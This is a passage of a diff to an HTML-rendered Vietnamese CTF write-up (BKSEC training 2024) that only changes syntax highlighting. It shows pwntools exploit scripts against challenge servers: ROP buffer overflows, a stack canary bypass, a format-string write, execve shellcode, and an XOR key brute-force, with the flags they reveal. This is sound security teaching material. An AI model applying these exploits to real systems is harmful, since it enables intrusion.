-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">win</span><span class="sh">"</span><span class="p">])</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"win"</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{2--&gt;\\xupgrade\\xBuffer\\xOv3rfl0w\\x1s\\xn0t\\xchiLL\\xhixxxxxxxxxxxxxx}
 </span></code></pre></div></div>
 
@@ -1270,24 +1270,24 @@ flag.lua: Lua bytecode, version 5.3
 <p>Về cơ bản, ý tưởng giải bài này y hệt bài phía trên. Chỉ khác ở bài này có thêm cờ canary được bật.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_3</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bof_3"</span><span class="p">)</span>
 <span class="c1"># p = process("./bof_3")
-</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6021</span><span class="p">)</span>
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6021</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">is: </span><span class="sh">'</span><span class="p">)</span>
-<span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">().</span><span class="nf">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
-<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">canary</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'is: '</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"canary"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
 
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401205</span>
 <span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x000000000040120e</span>
 <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000401398</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x58</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">win</span><span class="sh">"</span><span class="p">])</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span><span class="o">*</span><span class="mh">0x58</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"win"</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{W3_4LL_Hat3_c4NARY}
 </span></code></pre></div></div>
 
@@ -1323,23 +1323,23 @@ flag.lua: Lua bytecode, version 5.3
 <p>Đây là dạng bài <code class="language-plaintext highlighter-rouge">ret2win</code>, chúng ta chỉ cần thay đổi giá trị <code class="language-plaintext highlighter-rouge">target = 0x6F726568</code> sẽ có được shell.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./fmt_1</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6101</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./fmt_1"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6101</span><span class="p">)</span>
 
 <span class="n">target</span> <span class="o">=</span> <span class="mh">0x0804B39C</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x6568</span><span class="si">}</span><span class="s">c%23$n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x6F72</span> <span class="o">-</span> <span class="mh">0x6568</span><span class="si">}</span><span class="s">c%24$n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="mh">0x6568</span><span class="si">}</span><span class="s">c%23$n'</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="mh">0x6F72</span> <span class="o">-</span> <span class="mh">0x6568</span><span class="si">}</span><span class="s">c%24$n'</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s">'P'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">say?</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'say?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{R41s1ng_th3_H3rO}
 </span></code></pre></div></div>
 
@@ -1369,15 +1369,15 @@ flag.lua: Lua bytecode, version 5.3
 <p><img src="/images/bktrain2024/image-6.png" alt="alt text" /></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./shell_1</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6071</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./shell_1"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6071</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="sh">'</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">(max 256 bytes):</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="s">'</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'(max 256 bytes):</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{ju$7_A_5imPLE_ShelLCODE}
 </span></code></pre></div></div>
 
@@ -1399,20 +1399,20 @@ flag.lua: Lua bytecode, version 5.3
 
 <p>Đề bài cho chúng ta source code như sau</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
-<span class="kn">import</span> <span class="n">random</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="sh">'</span><span class="s">BKSEC{still secret}</span><span class="sh">'</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>
-<span class="n">key</span> <span class="o">=</span> <span class="sh">""</span> <span class="c1">#guess it if u can
-</span><span class="n">encode</span> <span class="o">=</span> <span class="sh">""</span>
-<span class="n">pivot</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">'BKSEC{still secret}'</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">""</span> <span class="c1">#guess it if u can
+</span><span class="n">encode</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">pivot</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">i</span> <span class="o">=</span> <span class="n">pivot</span>
 <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
-    <span class="n">encode</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">^</span><span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="n">encode</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
     <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
-    <span class="n">i</span> <span class="o">%=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
-<span class="n">output</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">pivot</span><span class="p">)</span> <span class="o">+</span> <span class="n">encode</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+    <span class="n">i</span> <span class="o">%=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+<span class="n">output</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">pivot</span><span class="p">)</span> <span class="o">+</span> <span class="n">encode</span>
+<span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>Từ <code class="language-plaintext highlighter-rouge">output</code>, chúng ta có thể biết một số thông tin như sau</p>
@@ -1429,19 +1429,19 @@ flag.lua: Lua bytecode, version 5.3
 <p>Nhờ việc connect server liên tục, ta có thể đoán được <code class="language-plaintext highlighter-rouge">len(key) = 50</code></p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># brute-force to find len of key
 </span><span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
 
     <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span> 
     <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="n">x</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+    <span class="n">x</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
 
-    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">pivot </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"pivot "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
 
-<span class="n">x</span><span class="p">.</span><span class="nf">sort</span><span class="p">()</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">x</span><span class="p">.</span><span class="n">sort</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>Kế tiếp, ta đã biết được <strong>flag gốc</strong> bắt đầu bằng cụm từ <strong>BKSEC{</strong>. Thử một số phép thử với mã hóa base64, ta nhận thấy flag sau khi encode luôn bắt đầu bằng <strong>QktTRUN7</strong>.</p>
@@ -1449,80 +1449,80 @@ flag.lua: Lua bytecode, version 5.3
 <p>Do ta đã biết đoạn <code class="language-plaintext highlighter-rouge">encoded</code>, kết hợp thuật toán nêu trên. Ta có thể tìm lại được <code class="language-plaintext highlighter-rouge">key</code> bằng cách cho connet server liên tục để khôi phục.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># brute-force to find key
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="n">strip</span><span class="p">()</span>
     <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 
-    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
     
-    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>Từ đây, ta có được <code class="language-plaintext highlighter-rouge">key</code> và việc giải bài toán còn lại là hoàn toàn dễ dàng</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="n">base64</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">base64</span>
 
 <span class="c1"># brute-force to find len of key
 </span><span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
 
     <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span> 
     <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="n">x</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+    <span class="n">x</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
 
     <span class="c1"># print(data)
-</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">pivot </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+</span>    <span class="k">print</span><span class="p">(</span><span class="s">"pivot "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
     <span class="c1"># p.close()
 </span>
-<span class="n">x</span><span class="p">.</span><span class="nf">sort</span><span class="p">()</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">x</span><span class="p">.</span><span class="n">sort</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
 
 <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span>
 <span class="n">lenkey</span> <span class="o">=</span> <span class="mi">50</span> 
